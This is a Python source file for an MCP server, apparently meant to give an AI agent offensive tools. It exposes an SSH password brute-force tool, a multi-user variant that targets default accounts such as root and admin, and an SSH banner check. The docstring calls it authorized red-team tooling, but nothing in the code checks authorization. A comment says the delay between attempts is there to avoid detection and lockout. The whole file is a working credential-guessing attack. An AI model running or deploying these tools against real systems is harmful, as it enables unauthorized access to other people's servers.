#!/usr/bin/env python3
"""
SSH Brute Force MCP Server

Provides SSH credential testing capabilities for authorized red team engagements:
- SSH login attempts with password lists
- Credential validation
- Success/failure reporting
"""

import asyncio
import json
import random
from typing import Optional
from mcp.server.fastmcp import FastMCP

# Import test mode utilities
from test_mode import is_test_mode

mcp = FastMCP("ssh-bruteforce")


# Common usernames for SSH brute forcing
DEFAULT_USERNAMES = ["root", "admin", "ubuntu", "user", "test", "guest"]


def fake_ssh_bruteforce(
    target: str,
    port: int,
    username: str,
    passwords: list[str],
    success_probability: float = 0.1,
) -> dict:
    """Generate fake SSH brute force results for test mode."""
    results = {
        "target": target,
        "port": port,
        "username": username,
        "total_attempts": len(passwords),
        "successful": [],
        "failed": [],
        "errors": [],
    }

    # Randomly select one password to "succeed" based on probability
    success_found = False
    for password in passwords:
        if not success_found and random.random() < success_probability:
            results["successful"].append({
                "password": password,
                "message": "Authentication successful",
            })
            success_found = True
        else:
            results["failed"].append({
                "password": password,
                "message": "Authentication failed",
            })

    results["status"] = "credentials_found" if results["successful"] else "no_valid_credentials"
    return results


async def try_ssh_login(
    target: str,
    port: int,
    username: str,
    password: str,
    timeout: int = 10,
) -> dict:
    """
    Attempt a single SSH login.

    Returns dict with success status and message.
    """
    try:
        import paramiko
    except ImportError:
        return {
            "success": False,
            "password": password,
            "error": "paramiko not installed. Run: pip install paramiko",
        }

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=target,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            look_for_keys=False,
            allow_agent=False,
        )
        client.close()
        return {
            "success": True,
            "password": password,
            "message": "Authentication successful",
        }
    except paramiko.AuthenticationException:
        return {
            "success": False,
            "password": password,
            "message": "Authentication failed",
        }
    except paramiko.SSHException as e:
        return {
            "success": False,
            "password": password,
            "error": f"SSH error: {str(e)}",
        }
    except Exception as e:
        return {
            "success": False,
            "password": password,
            "error": f"Connection error: {str(e)}",
        }
    finally:
        client.close()


@mcp.tool()
async def ssh_bruteforce(
    target: str,
    passwords: str,
    username: str = "root",
    port: int = 22,
    timeout: int = 10,
    delay: float = 0.5,
    stop_on_success: bool = True,
) -> str:
    """
    Perform SSH credential stuffing against a target.

    Args:
        target: Target hostname or IP address
        passwords: Comma-separated list of passwords to try
        username: SSH username to authenticate as (default: root)
        port: SSH port (default: 22)
        timeout: Connection timeout in seconds (default: 10)
        delay: Delay between attempts in seconds (default: 0.5)
        stop_on_success: Stop after finding valid credentials (default: True)

    Returns:
        JSON with results including successful and failed attempts
    """
    password_list = [p.strip() for p in passwords.split(",") if p.strip()]

    if not password_list:
        return json.dumps({"error": "No passwords provided"}, indent=2)

    # Test mode - return fake results
    if is_test_mode():
        return json.dumps(
            fake_ssh_bruteforce(target, port, username, password_list),
            indent=2,
        )

    results = {
        "target": target,
        "port": port,
        "username": username,
        "total_attempts": len(password_list),
        "successful": [],
        "failed": [],
        "errors": [],
    }

    for password in password_list:
        result = await try_ssh_login(target, port, username, password, timeout)

        if result.get("success"):
            results["successful"].append({
                "password": password,
                "message": result.get("message", ""),
            })
            if stop_on_success:
                break
        elif result.get("error"):
            results["errors"].append({
                "password": password,
                "error": result.get("error", ""),
            })
        else:
            results["failed"].append({
                "password": password,
                "message": result.get("message", ""),
            })

        # Delay between attempts to avoid detection/lockout
        if delay > 0:
            await asyncio.sleep(delay)

    results["status"] = "credentials_found" if results["successful"] else "no_valid_credentials"
    return json.dumps(results, indent=2)


@mcp.tool()
async def ssh_bruteforce_multi_user(
    target: str,
    passwords: str,
    usernames: Optional[str] = None,
    port: int = 22,
    timeout: int = 10,
    delay: float = 0.5,
    stop_on_success: bool = True,
) -> str:
    """
    Perform SSH credential stuffing with multiple usernames.

    Args:
        target: Target hostname or IP address
        passwords: Comma-separated list of passwords to try
        usernames: Comma-separated list of usernames (default: common usernames)
        port: SSH port (default: 22)
        timeout: Connection timeout in seconds (default: 10)
        delay: Delay between attempts in seconds (default: 0.5)
        stop_on_success: Stop after finding valid credentials (default: True)

    Returns:
        JSON with results for each username tested
    """
    password_list = [p.strip() for p in passwords.split(",") if p.strip()]

    if usernames:
        username_list = [u.strip() for u in usernames.split(",") if u.strip()]
    else:
        username_list = DEFAULT_USERNAMES

    if not password_list:
        return json.dumps({"error": "No passwords provided"}, indent=2)

    # Test mode - return fake results
    if is_test_mode():
        all_results = {
            "target": target,
            "port": port,
            "usernames_tested": username_list,
            "total_passwords": len(password_list),
            "results": {},
            "valid_credentials": [],
        }
        for username in username_list:
            result = fake_ssh_bruteforce(target, port, username, password_list)
            all_results["results"][username] = result
            if result["successful"]:
                for cred in result["successful"]:
                    all_results["valid_credentials"].append({
                        "username": username,
                        "password": cred["password"],
                    })
        return json.dumps(all_results, indent=2)

    all_results = {
        "target": target,
        "port": port,
        "usernames_tested": username_list,
        "total_passwords": len(password_list),
        "results": {},
        "valid_credentials": [],
    }

    for username in username_list:
        result_json = await ssh_bruteforce(
            target=target,
            passwords=passwords,
            username=username,
            port=port,
            timeout=timeout,
            delay=delay,
            stop_on_success=stop_on_success,
        )
        result = json.loads(result_json)
        all_results["results"][username] = result

        if result.get("successful"):
            for cred in result["successful"]:
                all_results["valid_credentials"].append({
                    "username": username,
                    "password": cred["password"],
                })
            if stop_on_success:
                break

    all_results["status"] = "credentials_found" if all_results["valid_credentials"] else "no_valid_credentials"
    return json.dumps(all_results, indent=2)


@mcp.tool()
async def ssh_check_connection(
    target: str,
    port: int = 22,
    timeout: int = 5,
) -> str:
    """
    Check if SSH port is open and responding on target.

    Args:
        target: Target hostname or IP address
        port: SSH port (default: 22)
        timeout: Connection timeout in seconds (default: 5)

    Returns:
        JSON with connection status and SSH banner if available
    """
    if is_test_mode():
        return json.dumps({
            "target": target,
            "port": port,
            "status": "open",
            "banner": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6",
        }, indent=2)

    import socket

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))

        # Try to grab SSH banner
        banner = ""
        try:
            banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
        except Exception:
            pass

        sock.close()

        return json.dumps({
            "target": target,
            "port": port,
            "status": "open",
            "banner": banner,
        }, indent=2)
    except socket.timeout:
        return json.dumps({
            "target": target,
            "port": port,
            "status": "timeout",
            "error": "Connection timed out",
        }, indent=2)
    except ConnectionRefusedError:
        return json.dumps({
            "target": target,
            "port": port,
            "status": "closed",
            "error": "Connection refused",
        }, indent=2)
    except Exception as e:
        return json.dumps({
            "target": target,
            "port": port,
            "status": "error",
            "error": str(e),
        }, indent=2)


if __name__ == "__main__":
    mcp.run()
